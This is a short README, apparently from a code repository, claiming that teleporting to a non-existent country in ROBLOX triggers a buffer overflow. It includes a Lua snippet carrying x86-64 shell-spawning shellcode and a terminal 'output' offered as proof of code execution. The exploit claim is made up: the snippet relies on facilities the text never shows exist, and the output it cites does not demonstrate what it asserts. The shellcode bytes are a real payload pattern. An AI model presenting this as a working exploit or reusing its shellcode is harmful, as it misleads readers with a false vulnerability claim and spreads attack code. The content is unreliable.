# Roblox-TeleportService-Buffer-Overflow
## Teleporting to a non-existent country to cause a ROBLOX Buffer overflow

I've found that if you try to teleport to a non-existent country, you can cause a buffer overflow.
To reproduce:
1. Join a game on ROBLOX
2. In your exploit, type:
`game:GetService'TeleportService':Teleport'Israel'`
You should get an error that says `Could not teleport to Israel`.
But, if you examine the error, you'll notice that it's much longer than it should be.

You can write shellcode using the 2nd argument of Teleport when teleporting to Israel:

##### Shellcode:
```lua
local shellcode = '\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

game:GetService'TeleportService':Teleport('Israel', setmetatable({}, {__gc = function() 
	local ffi = require'ffi'
	ffi.C.memcpy(nil, shellcode, #shellcode)
end}))
```
##### Output:
```
$ ls -l
total 40
-rw-rw-r-- 1 luis luis  6228 Oct 25 22:10 lib
-rw-rw-r-- 1 luis luis  4567 Oct 25 20:58 lib.lua
-rw-rw-r-- 1 luis luis   255 Oct 25 22:19 shellcode.lua

$ ./shellcode.lua
$
```
##### As you can see, it executed the ls command. You can use this to do anything!

Found by [Deniied0](https://github.com/Deniied0), [Jollycistaken](https://github.com/Jollycistaken), Mr Freeman#5361, [Zer0-AI](https://github.com/Zer0-AI)
